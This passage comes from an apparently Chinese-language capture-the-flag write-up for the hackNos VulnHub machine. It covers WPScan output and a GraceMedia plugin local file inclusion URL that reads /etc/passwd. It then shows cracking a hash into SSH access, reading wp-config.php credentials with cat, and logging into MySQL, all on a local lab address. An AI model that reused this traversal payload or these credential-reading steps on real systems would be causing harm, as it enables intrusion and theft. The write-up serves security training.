@ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.101/tsweb/</span></span><br><span class="line"><span class="string">[+] Started: Thu Dec 19 03:35:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.101/tsweb/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.101/tsweb/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentytwenty</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-12-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.1</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css?ver=1.0, Match: &#x27;</span>Version: 1.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] gracemedia-media-player</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2013-07-21T15:09:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (100% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span></span><br><span class="line"><span class="string"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:38 &lt;=======================================================================================================================================================&gt; (20466 / 20466) 100.00% Time: 00:00:38</span></span><br><span class="line"><span class="string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Theme(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.4 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-11-12T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentynineteen/style.css, Match: &#x27;</span>Version: 1.4<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentyseventeen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.2 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.2 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentyseventeen/style.css, Match: &#x27;</span>Version: 2.2<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentysixteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Sixteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentysixteen/style.css, Match: &#x27;</span>Version: 2.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] twentytwenty</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-12-13T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.1</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwenty/</span></span><br><span class="line"><span class="string"> | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Known Locations (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.101/tsweb/wp-content/themes/twentytwenty/style.css, Match: &#x27;</span>Version: 1.0<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:04 &lt;=========================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==============================================================================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Thu Dec 19 03:35:57 2019</span></span><br><span class="line"><span class="string">[+] Requests Done: 23078</span></span><br><span class="line"><span class="string">[+] Cached Requests: 46</span></span><br><span class="line"><span class="string">[+] Data Sent: 5.699 MB</span></span><br><span class="line"><span class="string">[+] Data Received: 3.448 MB</span></span><br><span class="line"><span class="string">[+] Memory used: 239.552 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:49</span></span><br></pre></td></tr></table></figure>

<p>网上搜索gracemedia-media-player插件发现存在本地文件包含漏洞，参考文章<span class="exturl" data-url="aHR0cHM6Ly9jeHNlY3VyaXR5LmNvbS9pc3N1ZS9XTEItMjAxOTAzMDExMw==">WordPress GraceMedia Media Player 1.0 Local File Inclusion<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin </span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin </span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin </span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync </span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin </span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin </span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin </span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin </span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin </span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin </span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin </span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin </span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin </span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin </span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin </span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin </span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin </span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin </span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin </span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin </span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin </span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin </span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="literal">false</span> </span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin </span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin </span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin </span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/<span class="literal">false</span> </span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin </span><br><span class="line">rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash </span><br><span class="line">mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span> </span><br><span class="line">flag:<span class="variable">$1</span><span class="variable">$flag</span><span class="variable">$vqjCxzjtRc7PofLYS2lWf</span>/:1001:1003::/home/flag:/bin/rbash</span><br></pre></td></tr></table></figure>

<p>在此找到flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/,将$1$flag$vqjCxzjtRc7PofLYS2lWf/解密得到结果topsecret</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub75.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub74.jpg"></p>
<p>然后使用flag/topsecret连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh flag@192.168.56.101</span></span><br><span class="line">flag@192.168.56.101<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information disabled due to load higher than 4.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5 packages can be updated.</span></span><br><span class="line"><span class="string">0 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Dec 19 09:18:02 2019 from 192.168.56.102</span></span><br><span class="line"><span class="string">Could not chdir to home directory /home/flag: No such file or directory</span></span><br><span class="line"><span class="string">flag@hacknos:/$ id</span></span><br><span class="line"><span class="string">uid=1001(flag) gid=1003(flag) groups=1003(flag)</span></span><br><span class="line"><span class="string">flag@hacknos:/$ whoami</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag@hacknos:/$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">flag@hacknos:/$</span></span><br></pre></td></tr></table></figure>

<h3 id="找第一个flag"><a href="#找第一个flag" class="headerlink" title="找第一个flag"></a>找第一个flag</h3><p>继续从之前得到的ssh用户的flag账号开始入手getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ ls /var/www/html/tsweb/</span><br><span class="line">index.php    readme.html      wp-admin            wp-comments-post.php  wp-config-sample.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php</span><br><span class="line">license.txt  wp-activate.php  wp-blog-header.php  wp-config.php         wp-content            wp-includes  wp-load.php        wp-mail.php   wp-signup.php    xmlrpc.php</span><br></pre></td></tr></table></figure>
<p>查看配置文件得到数据库的账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ cat /var/www/html/tsweb/wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>wpuser<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>hackNos-2.com<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">tsweb:</span><br><span class="line">define( <span class="string">&#x27;WP_SITEURL&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/tsweb&#x27;</span>);</span><br><span class="line">define( <span class="string">&#x27;WP_HOME&#x27;</span>, <span class="string">&#x27;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/tsweb&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;Z ly&#125;&#125;yxO6baps19c+.Ze(sw:r$o1M.oFLN]1vwc,pkQ8l&#123;o`6%w8u*c`4#O&gt;[4S&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;lGjW6&#125;I8iVCK]/&lt;;cfBh`c[yB$^XIbt(m7%d-;kvA4LW&lt;qAgxNZsw3ogYw8&amp;Vp&lt;1&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;ntPjJGZO55`]ki&gt;qpn/np9(1uN;kA]-NKM&lt;&amp;g2HV(6&gt;IqG[^z&#125;^kMl&amp; &#125;FA#* Y#&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;Sd]xrTb,rC(s#-m.A|pExO4wJv$G|RjjVNR&#125;WPjj;T)uTGhLfsDt=4vHPo3lb./M&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;$EM:;(zkTmf6qvF3rU=|&#123;WhROYu7h.fIwB(Zmj8b17+OOPSebjm&amp;u&lt;~]xv_`eHR`&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;:lDagF8+F*&#123;wa7~Ap+J^d,aFhV*)j;&lt;&#123;T!&lt;[(X!C5~ZE;,B[v]uyJs7Df)G&#123;CL~2&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;Yh04TE3)wNX+H**.2UgS?E=&#125;2 6B*WPk&gt;kd$Fb.&amp;&amp;~J3UL^f+fL|IsM&#125;uh)&lt;O!RS&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;|Nmraflo$=2t!/,=oy;.,4nK43OwzrVX*H:KdVu$myoQ@VP^H.BP#pV8905gjj&#125;s&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>

<p>very nice，使用以下命令连接数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag@hacknos:/$ mysql -h localhost -uwpuser -phackNos-2.com                                                                                                                                                                                </span><br><span class="line">mysql: [Warning] Using a password on the <span class="built_in">command</span> line interface can be insecure.                                                                                                                                                           </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                                                                                                                                  </span><br><span class="line">Your MySQL connection id is 18                                                                                                                                                                                                             </span><br><span class="line">Server version: 